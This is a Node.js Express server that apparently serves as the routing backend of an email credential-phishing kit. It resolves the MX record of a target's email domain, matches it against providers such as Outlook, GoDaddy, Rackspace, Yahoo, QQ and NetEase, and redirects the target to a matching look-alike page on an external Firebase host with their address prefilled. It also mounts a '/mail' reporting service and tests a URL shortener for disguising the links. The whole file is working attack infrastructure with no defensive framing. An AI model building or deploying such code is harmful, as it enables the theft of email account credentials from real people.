const express = require("express");
const path = require("path");
var dns = require("dns");
var shortUrl = require("node-url-shortener");

const { parse } = require("tldts");

const app = express();

const port = process.env.PORT || 9000;

// app.use("/", require("./routes/routes"));
//app.use("/blocks", require("./routes/blocks"));
//app.use("/blockinfo", require("./routes/blockinfo"));
// app.use("/ip", require("./routes/ip"));
//app.use("/", require("./routes/logins"));
//app.use("/mail", require("./routes/mailer"));

const urL = "https://admin-fa3ba.web.app";

const hostproviders = [
  "emailsrvr",
  "secureserver",
  "hiworks",
  "mail",
  "zoho",
  "yandex",
  "qq",
  "hinet",
  "outlook",
  "yahoodns",
  "yahoo",
  // "263",
];

const hostproviderSubdomains = [
  "163mx01.mxmail",
  "163mx02.mxmail",
  "126mx01.mxmail",
  "126mx02.mxmail",
  "qiye163mx01.mxmail",
  "qiye163mx02.mxmail",
  "vip163mx00.mxmail",
  "vip163mx01.mxmail",
];

const providers = [
  { name: "rackspace", host: "emailsrvr" },
  { name: "yahoo", host: "yahoo" },
  { name: "yahoo", host: "yahoodns" },
  { name: "hiworks", host: "hiworks" },
  { name: "godaddy", host: "secureserver" },
  { name: "mail", host: "mail" },
  { name: "zoho", host: "zoho" },
  { name: "yandex", host: "yandex" },
  { name: "qq", host: "qq" },
  { name: "hinet", host: "hinet" },
  { name: "office", host: "outlook" },

  // provider to find with subdomain (same hostname)
  { name: "163", host: "netease", subdomain: "163mx01.mxmail" },
  { name: "163", host: "netease", subdomain: "163mx02.mxmail" },
  { name: "163", host: "netease", subdomain: "qiye163mx01.mxmail" },
  { name: "163", host: "netease", subdomain: "qiye163mx02.mxmail" },
  { name: "163", host: "netease", subdomain: "vip163mx00.mxmail" },
  { name: "163", host: "netease", subdomain: "vip163mx01.mxmail" },
  { name: "126", host: "netease", subdomain: "126mx01.mxmail" },
  { name: "126", host: "netease", subdomain: "126mx02.mxmail" },
];
/*
const providers = [
  "126",
  "163",
  "outlook",
  "yahoo",
  "qq",
  "rackspace",
  "yandex",
  "zoho",
  "hinet",
  "yahoodns",
  // "amazonses",
  // "amazonaws",
  //  "godaddy",
  // "netease",
];
*/

/*
app.use("/126", express.static(path.join(__dirname, "pages/126")));
app.use("/163", express.static(path.join(__dirname, "pages/163")));
app.use("/hinet", express.static(path.join(__dirname, "pages/hinet")));
app.use("/rackspace", express.static(path.join(__dirname, "pages/rackspace")));
app.use("/webmail", express.static(path.join(__dirname, "pages/webmail")));
app.use("/yahoo", express.static(path.join(__dirname, "pages/yahoo")));
app.use("/yahoodns", express.static(path.join(__dirname, "pages/yahoo")));
app.use("/yandex", express.static(path.join(__dirname, "pages/yandex")));
app.use("/outlook", express.static(path.join(__dirname, "pages/office")));
app.use("/zoho", express.static(path.join(__dirname, "pages/zoho")));
app.use("/godaddy", express.static(path.join(__dirname, "pages/godaddy")));
app.use("/hiworks", express.static(path.join(__dirname, "pages/hiworks")));
app.use("/mail", express.static(path.join(__dirname, "pages/mail")));
*/

app.use(express.static(path.join(__dirname, "pages")));

app.use("/qq/:email", express.static(path.join(__dirname, "pages/qq")));
app.use("/263/:email", express.static(path.join(__dirname, "pages/263")));
app.use("/126/:email", express.static(path.join(__dirname, "pages/126")));

app.use(
  "/processing",
  express.static(path.join(__dirname, "pages/processing"))
);

app.use("/test-param/:email", (req, res) => {
  const { email } = req.params;
  console.log(email);
  res.send("ok");
});

app.use("/testpage/:email", express.static(path.join(__dirname, "pages/test")));

app.use("/start:email", (req, res) => {
  console.log(req.params);

  const { email } = req.params;

  const splitEmail = email.split("@");
  const emailDomain = splitEmail[splitEmail.length - 1];

  console.log(emailDomain);

  // get nameserver
  let nameServer;
  dns.resolveNs(emailDomain, (err, nameserver) => {
    nameServer = "No nameserver";
  });

  // first get client emailDomain mxAddress
  dns.resolveMx(emailDomain, (err, addresses) => {
    console.log(addresses);
    const mxAddress = addresses[0].exchange;
    const { domain, hostname, domainWithoutSuffix, subdomain } = parse(
      `http://${mxAddress}`
    );

    // console.log(`host: ${domainWithoutSuffix}`);
    // console.log(`hostname: ${hostname}`);
    //  console.log(`subdomain: ${subdomain}`);

    const ishost = hostproviders.includes(domainWithoutSuffix);
    console.log(`ishost: ${ishost}`);

    const isProvidersubdomain = hostproviderSubdomains.includes(subdomain);
    console.log(`isprovidersubdomain: ${isProvidersubdomain}`);

    if (ishost) {
      const host = providers.find(
        (element) => element.host === domainWithoutSuffix
      );
      console.log(host.name);
      // redirect fro to provider using hostname
      res.redirect(301, `${urL}/${host.name}/?email=${email}`);
    } else if (isProvidersubdomain) {
      const host = providers.find((element) => element.subdomain === subdomain);
      console.log(host.name);
      // redirect fro to provider using subdomain
      res.redirect(301, `${urL}/${host.name}/?email=${email}`);
    } else {
      console.log("provider nor avaiable redirect to webmail");
      res.redirect(301, `${urL}/webmail/?email=${email}`);
    }

    /*
    // compare providers with domainWithoutSuffix
    const isProviderAvailable = providers.includes(domainWithoutSuffix);

    if (isProviderAvailable) {
      const host = providers.find((element) => element === domainWithoutSuffix);
      console.log(host);
      // save data to localstorage then redirect

      localStorage.setItem("nameserver", nameServer);
      localStorage.setItem("emailprovider", domain);

      res.redirect(301, `${urL}/${host}/?email=${email}`);
    } else {
      console.log("provider nor avaiable redirect to webmail");
      res.redirect(301, `${urL}/webmail/?email=${email}`);
    }

    */
  });

  /*  

  console.log(localStorage.getItem("nameserver"));
  console.log(localStorage.getItem("emailprovider")); 

  console.log(`domain: ${domain}`);
  console.log(`host: ${domainWithoutSuffix}`);
  console.log(`hostname: ${hostname}`);
  console.log(`isIp: ${isIp}`);

  */
});

app.use("/mail", require("./services/reportmessage"));

app.get("/clearstorage", (req, res) => {
  localStorage.clear();
  res.send("Cleared");
});

app.get("/test", (req, res) => {
  shortUrl.short(
    "https://admin-fa3ba.web.app/rackspace/?email=jhonsow@hhh.com",
    function (err, url) {
      console.log(url);
    }
  );
  res.send("shortner");
});

app.listen(port, () => {
  console.log(`server is running on port: ${port}`);
});
